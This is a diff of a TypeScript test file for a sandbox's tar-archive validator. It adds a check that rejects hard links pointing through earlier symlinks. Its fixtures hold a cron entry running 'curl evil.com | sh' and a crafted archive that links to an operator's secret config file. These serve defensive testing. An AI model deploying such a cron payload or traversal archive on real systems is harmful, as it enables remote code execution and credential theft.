@@ -116,7 +116,10 @@ function buildTar(
  */
 type SandboxStateModule = Pick<
   typeof import("../../src/lib/state/sandbox.js"),
-  "validateTarEntries" | "rejectHardLinks" | "rejectSymlinkExtractionTraversal"
+  | "validateTarEntries"
+  | "rejectHardLinks"
+  | "rejectHardLinkExtractionTraversal"
+  | "rejectSymlinkExtractionTraversal"
 >;
 
 function isSandboxStateModule(
@@ -126,6 +129,7 @@ function isSandboxStateModule(
     value !== null &&
     typeof Reflect.get(value, "validateTarEntries") === "function" &&
     typeof Reflect.get(value, "rejectHardLinks") === "function" &&
+    typeof Reflect.get(value, "rejectHardLinkExtractionTraversal") === "function" &&
     typeof Reflect.get(value, "rejectSymlinkExtractionTraversal") === "function"
   );
 }
@@ -142,6 +146,7 @@ async function loadSandboxState(): Promise<SandboxStateModule> {
   return {
     validateTarEntries: mod.validateTarEntries,
     rejectHardLinks: mod.rejectHardLinks,
+    rejectHardLinkExtractionTraversal: mod.rejectHardLinkExtractionTraversal,
     rejectSymlinkExtractionTraversal: mod.rejectSymlinkExtractionTraversal,
   };
 }
@@ -205,7 +210,10 @@ describe("Fix: validateTarEntries rejects malicious tar entries", () => {
     const { validateTarEntries } = await loadSandboxState();
     const targetDir = "/tmp/nemoclaw-test-target";
     const tar = buildTar([
-      { path: "/etc/cron.d/backdoor", content: "* * * * * root curl evil.com | sh" },
+      {
+        path: "/etc/cron.d/backdoor",
+        content: "* * * * * root curl evil.com | sh",
+      },
     ]);
 
     const result = validateTarEntries(tar, targetDir);
@@ -377,5 +385,31 @@ describe("Fix: stopped-state extraction cannot write through archive symlinks", 
 
     expect(validation.safe).toBe(true);
     expect(rejectSymlinkExtractionTraversal(tar, validation.entries)).toEqual([]);
+  });
+
+  it("rejects a hard-link target below an earlier archive symlink", async () => {
+    const { rejectHardLinkExtractionTraversal, validateTarEntries } = await loadSandboxState();
+    const tar = buildTar([
+      { path: "home", type: "2", linkTarget: "/home/operator" },
+      { path: "stolen", type: "1", linkTarget: "home/.config/secret" },
+    ]);
+    const validation = validateTarEntries(tar, "/tmp/private-stopped-state");
+
+    expect(validation.safe).toBe(true);
+    expect(rejectHardLinkExtractionTraversal(tar, validation.entries)).toEqual([
+      "hard-link target 'home/.config/secret' in 'stolen' resolves through symlink 'home'",
+    ]);
+  });
+
+  it("allows a contained hard link whose target does not traverse a symlink", async () => {
+    const { rejectHardLinkExtractionTraversal, validateTarEntries } = await loadSandboxState();
+    const tar = buildTar([
+      { path: "workspace/source", content: "state" },
+      { path: "workspace/copy", type: "1", linkTarget: "workspace/source" },
+    ]);
+    const validation = validateTarEntries(tar, "/tmp/private-stopped-state");
+
+    expect(validation.safe).toBe(true);
+    expect(rejectHardLinkExtractionTraversal(tar, validation.entries)).toEqual([]);
   });
 });
